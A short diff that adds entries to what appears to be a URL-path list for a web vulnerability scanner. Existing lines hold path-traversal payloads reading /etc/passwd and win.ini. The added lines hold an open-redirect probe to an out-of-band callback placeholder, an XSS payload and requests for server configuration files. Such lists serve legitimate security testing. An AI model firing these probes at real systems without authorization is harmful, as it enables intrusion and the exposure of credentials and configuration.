@@ -32,3 +32,12 @@
 /tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
 /download_work_dir_file?path=/etc/passwd
 /hx/resources/public/$SCHEMAS$?Filename=c%3a%5cwindows%5cwin.ini
+/urve/site/login.html?lang=en
+/_internal/redirect.php?url=http://{{interactsh-url}}
+/?PagePrincipale/upload&file=%22%3E%3Csvg/onload=alert(document.domain)%3E
+/webapps/xwiki/WEB-INF/xwiki.properties
+/geoserver/wfs?service=WMS&request=GetMap
+/wfs?service=WMS&request=GetMap
+/wp-json/atarim/v1/db/vc
+/h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml
+/user/login
